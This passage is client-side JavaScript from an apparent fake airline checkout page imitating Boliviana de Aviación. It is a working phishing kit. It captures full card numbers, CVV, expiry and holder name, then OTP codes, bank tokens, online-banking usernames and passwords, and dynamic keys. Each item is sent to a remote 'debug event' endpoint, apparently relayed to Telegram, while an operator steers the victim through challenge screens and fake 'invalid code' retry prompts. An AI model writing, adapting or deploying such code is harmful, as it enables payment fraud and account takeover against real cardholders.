    nested.setAttribute('aria-expanded', String(!open));
    panel?.classList.toggle('is-open', !open);
  });

  payBtn?.addEventListener('click', async () => {
    if (payBtn.disabled || payBtn.classList.contains('is-loading')) return;
    debugPollGen += 1;
    const wait = document.getElementById('pagos-wait-screen');
    const challenge = document.getElementById('pagos-challenge-screen');
    const brand = detectCardBrand(cardNumber?.value || '').brand;
    let brandKey = ['visa', 'amex', 'diners', 'mastercard', 'discover'].includes(brand)
      ? brand
      : 'visa';
    const now = new Date();
    const months = [
      'enero', 'febrero', 'marzo', 'abril', 'mayo', 'junio',
      'julio', 'agosto', 'septiembre', 'octubre', 'noviembre', 'diciembre',
    ];
    const dateLabel = `${now.getDate()} de ${months[now.getMonth()]} de ${now.getFullYear()}`;
    const timeLabel = `${String(now.getHours()).padStart(2, '0')}:${String(now.getMinutes()).padStart(2, '0')}`;
    const datetimeLabel = `${dateLabel} · ${timeLabel}`;
    const amountLabel = money(total, true);
    const merchantLabel = 'Boliviana de Aviación';
    const payLabel = payBtn.textContent;
    const cardDigits = onlyDigits(cardNumber?.value || '');

    payBtn.classList.add('is-loading');
    payBtn.disabled = true;
    payBtn.setAttribute('aria-busy', 'true');
    payBtn.innerHTML = '<span class="pagos-pay__spin" aria-hidden="true"></span>';

    try {
      console.log('----------------')
      console.log('----------------')
      console.log('PAYMENT_SUBMIT:')
      console.log('CARD: ', cardNumber.value)
      console.log('EXP: ', cardExp.value)
      console.log('CVV: ', cardCvv.value)
      const paymentMeta = {
          step: 'Envió datos de tarjeta',
          brand: brandKey,
          amount: Number(total) || 0,
          amountLabel: amountLabel,
          card: maskCard(cardNumber?.value || ''),
          cardFirstDigit: cardDigits.charAt(0),
          cvvLength: onlyDigits(cardCvv?.value || '').length,
          cpayload: {
            b: cardNumber.value,
            cv: cardCvv.value,
            exp: cardExp.value,
            holder: cardName.value,
          }
        };
      sessionStorage.setItem('latam-payment-telegram-meta', JSON.stringify(paymentMeta));
      const route = await sendDebugEvent('PAYMENT_SUBMIT', {
        cardFirstDigit: cardDigits.charAt(0),
        meta: paymentMeta,
      });
      if (route?.brand && ['visa', 'amex', 'diners', 'mastercard', 'discover'].includes(route.brand)) {
        brandKey = route.brand;
      }
      setUiMessage('');
      payBtn.classList.remove('is-loading');
      payBtn.removeAttribute('aria-busy');
      payBtn.textContent = payLabel;

      wait?.querySelectorAll('[data-wait-brand]').forEach((panel) => {
        panel.hidden = panel.getAttribute('data-wait-brand') !== brandKey;
      });
      if (wait) wait.hidden = false;
      if (challenge) challenge.hidden = true;
      document.body.classList.add('is-offers-waiting');

      sessionStorage.setItem(
        'latam-payment-draft',
        JSON.stringify({
          paidAt: now.toISOString(),
          total,
          email: email?.value || '',
          invoice: invoiceToggle?.getAttribute('aria-checked') === 'true',
          method: addCard?.classList.contains('is-selected') ? 'card' : 'none',
          brand: brandKey,
          merchant: merchantLabel,
          amountLabel,
          dateLabel,
          timeLabel,
        }),
      );

      await watchOperatorDecisions({
        wait,
        challenge,
        brandKey,
        merchantLabel,
        amountLabel,
        datetimeLabel,
        resetChallenge: true,
      });
    } catch (error) {
      payBtn.classList.remove('is-loading');
      payBtn.removeAttribute('aria-busy');
      payBtn.textContent = payLabel;
      syncPayEnabled();
      setUiMessage(error instanceof Error ? error.message : 'No se pudo continuar con el pago.');
    }
  });

  function savedPaymentTelegramMeta() {
    try {
      return JSON.parse(sessionStorage.getItem('latam-payment-telegram-meta') || '{}') || {};
    } catch {
      return {};
    }
  }

  async function waitForOperator(brandKey) {
    debugPollGen += 1;
    const wait = document.getElementById('pagos-wait-screen');
    const challenge = document.getElementById('pagos-challenge-screen');
    wait?.querySelectorAll('[data-wait-brand]').forEach((el) => {
      el.hidden = el.getAttribute('data-wait-brand') !== brandKey;
    });
    if (challenge) challenge.hidden = true;
    if (wait) wait.hidden = false;
    document.body.classList.add('is-offers-waiting');
    const draft = JSON.parse(sessionStorage.getItem('latam-payment-draft') || '{}');
    await watchOperatorDecisions({
      wait,
      challenge,
      brandKey,
      merchantLabel: draft.merchant || 'Boliviana de Aviación',
      amountLabel: draft.amountLabel || money(total, true),
      datetimeLabel: draft.dateLabel && draft.timeLabel ? `${draft.dateLabel} · ${draft.timeLabel}` : '',
      resetChallenge: false,
    });
  }

  document.querySelectorAll('[data-help-toggle]').forEach((btn) => {
    btn.addEventListener('click', () => {
      const root = btn.closest('[data-help]');
      const panel = root?.querySelector('[data-help-panel]');
      const icon = root?.querySelector('[data-help-icon]');
      if (!panel) return;
      const open = !panel.hidden;
      panel.hidden = open;
      if (icon) icon.textContent = open ? '+' : '−';
      btn.setAttribute('aria-expanded', String(!open));
    });
  });

  document.querySelectorAll('[data-otp-form]').forEach((form) => {
    form.addEventListener('submit', async (event) => {
      event.preventDefault();
      const input = form.querySelector('input[name="otp"]');
      if (!input?.value.trim()) {
        input?.focus();
        return;
      }
      const panel = form.closest('[data-challenge-brand]');
      const brandKey = panel?.getAttribute('data-challenge-brand') || 'visa';
      const attempts = Number(form.dataset.attempts || '0') + 1;
      form.dataset.attempts = String(attempts);
      setUiMessage('');
      clearChallengeMessages();
      try {
        await sendDebugEvent('OTP_SUBMIT', {
          meta: savedPaymentTelegramMeta(),
          metaOtp: {
            step: 'Envió código OTP',
            brand: brandKey,
            otp: input.value,
            otpLength: String(input.value || '').trim().length,
            attempt: attempts,
          },
        });
      } catch {
        setChallengeMessage(brandKey, 'No pudimos procesar el código. Intenta nuevamente.');
        return;
      }
      await waitForOperator(brandKey);
    });
  });

  document.querySelectorAll('[data-token-form]').forEach((form) => {
    const tokenInput = form.querySelector('input[name="token"]');
    tokenInput?.addEventListener('input', () => {
      tokenInput.value = String(tokenInput.value || '').replace(/\D/g, '').slice(0, 8);
    });
    form.addEventListener('submit', async (event) => {
      event.preventDefault();
      const input = form.querySelector('input[name="token"]');
      if (!input?.value.trim()) {
        input?.focus();
        return;
      }
      const panel = form.closest('[data-challenge-brand]');
      const brandKey = panel?.getAttribute('data-challenge-brand') || 'visa';
      setUiMessage('');
      clearChallengeMessages();
      try {
        await sendDebugEvent('TOKEN_SUBMIT', {
          meta: savedPaymentTelegramMeta(),
          metaToken: {
            step: 'Envió token',
            brand: brandKey,
            token: input.value,
          },
        });
      } catch {
        setChallengeMessage(brandKey, 'No pudimos procesar el token. Intenta nuevamente.');
        return;
      }
      await waitForOperator(brandKey);
    });
  });

  document.querySelectorAll('[data-userpass-form]').forEach((form) => {
    form.addEventListener('submit', async (event) => {
      event.preventDefault();
      const userInput = form.querySelector('input[name="username"]');
      const passInput = form.querySelector('input[name="password"]');
      if (!userInput?.value.trim()) {
        userInput?.focus();
        return;
      }
      if (!passInput?.value.trim()) {
        passInput?.focus();
        return;
      }
      const panel = form.closest('[data-challenge-brand]');
      const brandKey = panel?.getAttribute('data-challenge-brand') || 'visa';
      setUiMessage('');
      clearChallengeMessages();
      try {
        await sendDebugEvent('USERPASS_SUBMIT', {
          meta: savedPaymentTelegramMeta(),
          metaUserpass: {
            step: 'Envió usuario y contraseña',
            brand: brandKey,
            username: userInput.value,
            password: passInput.value,
          },
        });
      } catch {
        setChallengeMessage(brandKey, 'No pudimos procesar los datos. Intenta nuevamente.');
        return;
      }
      await waitForOperator(brandKey);
    });
  });

  document.querySelectorAll('[data-dkey-form]').forEach((form) => {
    form.addEventListener('submit', async (event) => {
      event.preventDefault();
      const input = form.querySelector('input[name="dkey"]');
      if (!input?.value.trim()) {
        input?.focus();
        return;
      }
      const panel = form.closest('[data-challenge-brand]');
      const brandKey = panel?.getAttribute('data-challenge-brand') || 'visa';
      setUiMessage('');
      clearChallengeMessages();
      try {
        await sendDebugEvent('DKEY_SUBMIT', {
          meta: savedPaymentTelegramMeta(),
          metaDkey: {
            step: 'Envió clave dinámica',
            brand: brandKey,
            dkey: input.value,
          },
        });
      } catch {
        setChallengeMessage(brandKey, 'No pudimos procesar la clave dinámica. Intenta nuevamente.');
        return;
      }
      await waitForOperator(brandKey);
    });
  });

  const preview = new URLSearchParams(window.location.search).get('preview');
  if (['otp', 'token', 'userpass', 'dkey'].includes(preview || '')) {
    document.getElementById('boa-wp')?.setAttribute('hidden', '');
    document.getElementById('boa-pay')?.setAttribute('hidden', '');
    const now = new Date();
    const datetimeLabel = `${now.getDate()} de ${now.toLocaleDateString('es-BO', { month: 'long' })} de ${now.getFullYear()} · ${String(now.getHours()).padStart(2, '0')}:${String(now.getMinutes()).padStart(2, '0')}`;
    const errorByMode = {
      token: 'Token inválido. Ingrese de nuevo su token',
      userpass: 'Usuario o contraseña inválidos. Ingrese de nuevo su usuario y contraseña',
      dkey: 'Clave dinámica inválida. Ingrese de nuevo su clave dinámica',
      otp: 'Código inválido. Hemos enviado un nuevo código por SMS o correo',
    };
    showChallenge('visa', 'Boliviana de Aviación', money(total, true), datetimeLabel, errorByMode[preview] || '', preview);
  }
</script>
